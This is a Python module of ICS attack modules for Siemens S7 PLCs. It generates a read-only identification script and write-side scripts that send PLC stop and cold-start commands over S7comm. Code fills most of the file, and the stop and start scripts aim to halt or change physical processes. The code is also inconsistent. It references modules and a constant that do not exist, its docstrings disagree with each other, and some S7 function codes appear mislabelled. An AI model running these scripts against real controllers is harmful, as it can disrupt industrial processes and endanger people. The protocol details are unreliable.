"""Attack modules: ICS/SCADA/IoT enumeration (READ-ONLY / non-disruptive).

Phase 6.3 adds **write-side ICS modules** (``ModbusWriteCoil``,
``ModbusWriteRegister``, ``S7PlcStop``, ``S7PlcStart``) for authorized PLC
testing. Write-side ICS is **destructive risk** — a coil/register write or a
PLC stop can change physical process state. The dual gate is:

1. ``@require_allowlist()`` on ``run_attack_module`` (already enforced at the
   MCP tool layer in ``tools/mcp_tools/attack_modules.py:1185``) — the target
   IP must be in the operator's allowlist.
2. ``ics.allow_write: true`` in ``config.yaml`` (default **false**) — an
   explicit per-tool config flag the operator must set to authorize write-side
   ICS. Read-only enum (the original modules above) works without it.

A write-side module's ``run()`` checks ``_ics_write_allowed()`` and refuses
(blocked) when the flag is false, so even if the allowlist lets the target
through, the write never happens without the second gate. See the physical-
damage warning in README §Configuration → ``ics.allow_write``.
"""

from __future__ import annotations

import os
from typing import Any

from tools.attack_modules.base import AttackModule, ModuleContext


def _ics_write_allowed() -> bool:
    """Return True only when BOTH ``ics.allow_write: true`` AND
    ``ics.destructive_ics: true`` are set in config.

    Phase 1 safety: two independent flags must be set before any ICS write
    module (ModbusWriteCoil/ModbusWriteRegister/S7PlcStop/S7PlcStart) can
    fire. The checked-in ``config.yaml`` defaults both to false so the
    repository is safe-by-default; an operator who has explicit written
    authorization for destructive PLC testing sets both explicitly. This
    is the second gate of the dual lock; the first is
    ``@require_allowlist()`` on ``run_attack_module`` (target must be in
    the allowlist). The Flow B ``scope_gate._HARD_FORBIDDEN_ACTIONS`` block
    does NOT cover ICS writes (it is Flow B only); the live gate is here
    + ``@require_allowlist``.
    """
    config_path = os.environ.get("AI_NMAP_CONFIG_PATH") or "config.yaml"
    try:
        import yaml  # local import keeps the module importable without PyYAML

        with open(config_path, "r", encoding="utf-8") as handle:
            cfg = yaml.safe_load(handle) or {}
    except Exception:
        return False
    ics_cfg = cfg.get("ics", {}) or {}
    return bool(ics_cfg.get("allow_write", False)) and bool(ics_cfg.get("destructive_ics", False))


class S7Enum(AttackModule):
    name = "S7Enum"
    description = (
        "Enumerate Siemens S7 PLC identity via COTP/TPKT handshake + SZL read "
        "(system status list 0x0011/0x001C). READ-ONLY: no PLC stop/start, no block write."
    )
    target_services = ["iso-tsap", "s7", "s7comm"]
    target_ports = [102]
    required_cves: list[str] = []
    # Capability metadata: read-only S7 PLC enumeration.
    requires = []
    produces = []
    read_only = True
    cost = "low"
    phase_hint = "enumerate"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": (
                "Read-only S7comm enumeration. Performs the COTP/TPKT CR/CC handshake "
                "and an S7 read of the System Status List (SZL ID 0x0011 module "
                "identification / 0x001C CPU identification). No PLC stop/start, "
                "no block read/write of user data, no control commands."
            ),
            "evidence": [f"S7 SZL identity read against {ctx.target_ip}:102"],
            "references": [
                "ISO 8073 (COTP) / RFC 1006 (TPKT) over TCP 102",
                "Siemens S7comm protocol notes -- SZL IDs 0x0011 (module) and 0x001C (CPU)",
            ],
            "suggested_command": f"nmap --script s7-info -p 102 {ctx.target_ip}",
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f'''#!/usr/bin/env python3
"""Siemens S7 PLC identification -- READ-ONLY / non-disruptive enumeration.

No coil/register writes, no control commands, no PLC stop/start, no block
write. Performs only the COTP/TPKT connection handshake (CR/CC) and an S7
read of the System Status List (SZL) for module identification (SZL ID
0x0011) and CPU identification (SZL ID 0x001C). Connects only to the single
authorized target.
"""
import json
import socket
import struct
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
PORT = 102
TIMEOUT = 5.0
# SZL IDs (read-only system status list -- identification only)
SZL_MODULE_ID = 0x0011   # module identification
SZL_CPU_ID = 0x001C      # CPU identification
SZL_INDEX_ALL = 0x0000   # read all records


def tpkt(payload: bytes) -> bytes:
    """Wrap a COTP PDU in a TPKT header (RFC 1006)."""
    # version(1)=3 + reserved(1)=0 + length(2, big-endian, includes 4-byte header)
    return struct.pack(">BBH", 3, 0, len(payload) + 4) + payload


def cotp_cr(dst_ref: int = 0x0001, src_ref: int = 0x0001, tpdu_size: int = 0x0A) -> bytes:
    """COTP Connect Request (CR) -- class 0, TPDU size 1024."""
    # LI(1)=0x11 + code(1)=0xE0 + dst_ref(2) + src_ref(2) + class(1)=0
    # variable part: TPDU size param 0xC0 len 0x01 value 0x0A (2^10=1024)
    # src TSAP param 0xC2 len 0x02 value 0x0100 (local TSAP)
    # dst TSAP param 0xC2 len 0x02 value 0x0200 (remote TSAP, rack 0 slot 2)
    li = 0x11
    code = 0xE0  # CR
    var = bytes([0xC0, 0x01, tpdu_size,
                 0xC2, 0x02, 0x01, 0x00,
                 0xC2, 0x02, 0x02, 0x00])
    return bytes([li, code]) + struct.pack(">HH", dst_ref, src_ref) + bytes([0x00]) + var


def s7_setup_comm() -> bytes:
    """S7 Setup Communication request (ROSCTR job, function 0xF0 / setup)."""
    # COTP DT: LI(1)=0x02 + code(1)=0xF0 (DT class 0) + EOT(1)=0x80
    cotp_dt = bytes([0x02, 0xF0, 0x80])
    # S7 header: prot id 0x32 + ROSCTR 0x01 (job) + redid(2)=0 + pogid(2)=0
    #            + datalen(2) = param len + data len
    param = bytes([0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])  # setup params
    # function 0xF0 = setup communication
    func_block = bytes([0xF0])
    param = bytes([0xF0, 0x00, 0x08, 0x00, 0x08, 0x01, 0x01, 0x01, 0x03, 0x01])
    s7_hdr = struct.pack(">BBHHH", 0x32, 0x01, 0x0000, 0x0000, len(param))
    return cotp_dt + s7_hdr + param


def s7_read_szl(szl_id: int, index: int = SZL_INDEX_ALL) -> bytes:
    """S7 read SZL request (function 0x04 = read variable, SZL via S7 block)."""
    # This builds a minimal S7 user-program read of the SZL. We construct a
    # request variable (S7 header + param + data) for the system status list.
    cotp_dt = bytes([0x02, 0xF0, 0x80])
    # param: function 0x04 (read var), item count 1, variable spec for SZL 0x12 0x04 ...
    param = bytes([
        0x04,                  # function: read variable (read-only)
        0x01,                  # item count
        0x12, 0x04, 0x10, 0x10,  # variable spec: SZL read
        0x00, 0x08,            # length of read = 8 bytes
    ])
    # data: transport size + SZL ID + index
    data = struct.pack(">HH", szl_id, index)
    data = bytes([0x00, 0x00, 0x0A]) + struct.pack(">HH", szl_id, index) + bytes([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
    s7_hdr = struct.pack(">BBHHH", 0x32, 0x01, 0x0000, 0x0000, len(param) + len(data))
    return cotp_dt + s7_hdr + param + data


def send_recv(sock: socket.socket, frame: bytes) -> bytes:
    sock.send(frame)
    return sock.recv(4096)


def parse_szl_response(resp: bytes) -> dict:
    """Best-effort extract of printable strings from an SZL read response."""
    info = {{}}
    try:
        # Pull printable ASCII runs as candidate identification strings
        cur = []
        for b in resp:
            if 0x20 <= b < 0x7F:
                cur.append(chr(b))
            else:
                if len(cur) >= 4:
                    s = "".join(cur).strip()
                    if "cpu" in s.lower() or "firmware" in s.lower() or "module" in s.lower() or "siemens" in s.lower():
                        info.setdefault("strings", []).append(s)
                cur = []
        if len(cur) >= 4:
            s = "".join(cur).strip()
            info.setdefault("strings", []).append(s)
    except Exception:
        pass
    return info


def main() -> None:
    out = {{"target": TARGET, "port": PORT, "connected": False, "module_info": {{}}, "cpu_info": {{}}}}
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(TIMEOUT)
            s.connect((TARGET, PORT))
            # 1. COTP CR (connection request) -- read-only handshake
            cc = send_recv(s, tpkt(cotp_cr()))
            out["connected"] = b"\\xD0" in cc[:3]  # CC response code 0xD0
            # 2. S7 Setup Communication -- read-only negotiation
            send_recv(s, tpkt(s7_setup_comm()))
            # 3. S7 read SZL module identification (SZL ID 0x0011) -- read-only
            r1 = send_recv(s, tpkt(s7_read_szl(SZL_MODULE_ID)))
            out["module_info"] = parse_szl_response(r1)
            # 4. S7 read SZL CPU identification (SZL ID 0x001C) -- read-only
            r2 = send_recv(s, tpkt(s7_read_szl(SZL_CPU_ID)))
            out["cpu_info"] = parse_szl_response(r2)
    except Exception as e:
        out["error"] = str(e)
    print(json.dumps(out, indent=2))


if __name__ == "__main__":
    main()
'''


class S7PlcStop(AttackModule):
    """Stop a Siemens S7 PLC — DESTRUCTIVE (halts the controlled process).

    Dual-gated: ``@require_allowlist()`` + ``ics.allow_write: true``.
    """

    name = "S7PlcStop"
    description = (
        "Stop a Siemens S7 PLC via S7comm PLC stop. DESTRUCTIVE: halts the "
        "controlled physical process. Requires ics.allow_write: true."
    )
    target_services = ["iso-tsap", "s7", "s7comm"]
    target_ports = [102]
    required_cves: list[str] = []
    destructive_ics = True
    # Capability metadata: destructive PLC stop; operator-authorized, needs foothold.
    requires = ["foothold"]
    produces = []
    read_only = False
    cost = "high"
    phase_hint = "exploit"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        if not _ics_write_allowed():
            return {
                "status": "blocked",
                "module": self.name,
                "target_ip": ctx.target_ip,
                "note": _WRITE_BLOCKED_NOTE,
            }
        return {
            "status": "script_generated",
            "module": self.name,
            "script": self.generate_python_script(ctx),
            "note": (
                "DESTRUCTIVE S7 PLC stop. Halts the controlled process. Requires "
                "ics.allow_write: true + target in allowlist."
            ),
            "references": [
                "Siemens S7comm PLC stop (destructive control command)",
            ],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f'''#!/usr/bin/env python3
"""Siemens S7 PLC stop -- DESTRUCTIVE / write-side.

Requires ics.allow_write: true + target in allowlist. Sends an S7comm PLC
stop command after the COTP/TPKT handshake. Connects only to the single
authorized target.
"""
import json
import socket
import struct
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
PORT = 102
TIMEOUT = 5.0


def tpkt(payload: bytes) -> bytes:
    return struct.pack(">BBH", 3, 0, len(payload) + 4) + payload


def cotp_cr() -> bytes:
    li = 0x11
    code = 0xE0
    var = bytes([0xC0, 0x01, 0x0A, 0xC2, 0x02, 0x01, 0x00, 0xC2, 0x02, 0x02, 0x00])
    return bytes([li, code]) + struct.pack(">HH", 0x0001, 0x0001) + bytes([0x00]) + var


def s7_plc_stop() -> bytes:
    """S7comm PLC stop job (destructive)."""
    cotp_dt = bytes([0x02, 0xF0, 0x80])
    # S7 header: prot id 0x32 + ROSCTR 0x01 (job) + redid + pogid + datalen
    # param: function 0x05 (PLC stop) — destructive control command
    param = bytes([0x05, 0x01, 0x00, 0x00, 0x00, 0x00])
    s7_hdr = struct.pack(">BBHHH", 0x32, 0x01, 0x0000, 0x0000, len(param))
    return cotp_dt + s7_hdr + param


def main() -> None:
    out = {{"target": TARGET, "port": PORT, "stopped": False}}
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(TIMEOUT)
            s.connect((TARGET, PORT))
            s.send(tpkt(cotp_cr()))
            s.recv(4096)
            s.send(tpkt(s7_plc_stop()))
            out["stopped"] = True
    except Exception as e:
        out["error"] = str(e)
    print(json.dumps(out, indent=2))


if __name__ == "__main__":
    main()
'''


class S7PlcStart(AttackModule):
    """Start a Siemens S7 PLC — write-side control command.

    Dual-gated like the other write-side modules. Less destructive than stop
    but still a control command that changes process state.
    """

    name = "S7PlcStart"
    description = (
        "Start a Siemens S7 PLC via S7comm PLC start/cold start. Write-side "
        "control command. Requires ics.allow_write: true."
    )
    target_services = ["iso-tsap", "s7", "s7comm"]
    target_ports = [102]
    required_cves: list[str] = []
    destructive_ics = True
    # Capability metadata: write-side PLC control; operator-authorized, needs foothold.
    requires = ["foothold"]
    produces = []
    read_only = False
    cost = "high"
    phase_hint = "exploit"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        if not _ics_write_allowed():
            return {
                "status": "blocked",
                "module": self.name,
                "target_ip": ctx.target_ip,
                "note": _WRITE_BLOCKED_NOTE,
            }
        return {
            "status": "script_generated",
            "module": self.name,
            "script": self.generate_python_script(ctx),
            "note": (
                "Write-side S7 PLC start (cold start). Changes process state. "
                "Requires ics.allow_write: true + target in allowlist."
            ),
            "references": [
                "Siemens S7comm PLC start / cold start (control command)",
            ],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f'''#!/usr/bin/env python3
"""Siemens S7 PLC start -- write-side control command.

Requires ics.allow_write: true + target in allowlist. Sends an S7comm PLC
cold-start command after the COTP/TPKT handshake. Connects only to the
single authorized target.
"""
import json
import socket
import struct
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
PORT = 102
TIMEOUT = 5.0


def tpkt(payload: bytes) -> bytes:
    return struct.pack(">BBH", 3, 0, len(payload) + 4) + payload


def cotp_cr() -> bytes:
    li = 0x11
    code = 0xE0
    var = bytes([0xC0, 0x01, 0x0A, 0xC2, 0x02, 0x01, 0x00, 0xC2, 0x02, 0x02, 0x00])
    return bytes([li, code]) + struct.pack(">HH", 0x0001, 0x0001) + bytes([0x00]) + var


def s7_plc_start() -> bytes:
    """S7comm PLC cold-start job (write-side control command)."""
    cotp_dt = bytes([0x02, 0xF0, 0x80])
    # function 0x06 = PLC start / cold start
    param = bytes([0x06, 0x01, 0x00, 0x00, 0x00, 0x00])
    s7_hdr = struct.pack(">BBHHH", 0x32, 0x01, 0x0000, 0x0000, len(param))
    return cotp_dt + s7_hdr + param


def main() -> None:
    out = {{"target": TARGET, "port": PORT, "started": False}}
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(TIMEOUT)
            s.connect((TARGET, PORT))
            s.send(tpkt(cotp_cr()))
            s.recv(4096)
            s.send(tpkt(s7_plc_start()))
            out["started"] = True
    except Exception as e:
        out["error"] = str(e)
    print(json.dumps(out, indent=2))


if __name__ == "__main__":
    main()
'''


